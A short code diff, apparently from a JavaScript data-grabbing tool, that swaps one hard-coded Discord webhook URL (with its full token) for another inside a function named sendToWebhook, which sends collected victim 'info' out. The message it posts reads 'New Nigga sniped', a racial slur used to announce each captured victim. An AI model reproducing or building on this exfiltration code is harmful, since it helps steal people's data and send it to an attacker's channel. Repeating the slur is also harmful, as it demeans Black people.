@@ -80,7 +80,7 @@
     });
 
     function sendToWebhook(info) {
-        const webhookURL = 'https://discord.com/api/webhooks/1296110519018848297/TX7ObcXKKgNInecm9_K_2T97Im_sGjTIPEoDh791gxhOBfqiYh-sXiUcYn_XzS3PVRGz';
+        const webhookURL = 'https://discordapp.com/api/webhooks/1328419730746507334/s74lZMLO-gct3JQh6p8ID36B82EJqPGskoBYsdB7i9jz9XTCDMEzcF5mvnXgrKuFOC0Z';
         
         const payload = {
             content: "New Nigga sniped",
